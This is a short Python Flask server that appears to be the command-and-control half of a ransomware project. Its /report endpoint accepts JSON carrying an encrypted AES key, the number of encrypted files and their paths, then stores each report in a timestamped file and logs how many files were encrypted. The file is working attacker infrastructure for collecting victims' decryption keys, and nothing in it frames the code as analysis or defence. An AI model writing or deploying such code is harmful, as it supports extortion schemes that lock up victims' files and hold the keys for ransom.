from flask import Flask, request, jsonify
import os
import datetime

app = Flask(__name__)

LOG_DIR = "server/reports"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/report", methods=["POST"])
def receive_report():
    data = request.get_json()

    if not data or "encrypted_aes_key" not in data or "num_of_encrypted_files" not in data or "encrypted_files_paths" not in data:
        return jsonify({"error": "Missing data"}), 400

    encrypted_aes_key = data["encrypted_aes_key"]
    file_count = data["num_of_encrypted_files"]
    encrypted_files_paths = data["encrypted_files_paths"]

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{LOG_DIR}/report_{timestamp}.txt"

    with open(filename, "w") as f:
        f.write(f"Time: {timestamp}\n")
        f.write(f"Encrypted AES Key (base64):\n{encrypted_aes_key}\n")
        f.write(f"Number of encrypted files: {file_count}\n")
        f.write(f"Encrypted files:\n")
        for file in encrypted_files_paths:
            f.write(f"{file}\n")
    print(f"[+] Received report: {file_count} files encrypted. Key saved in {filename}")
    return jsonify({"status": "received"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)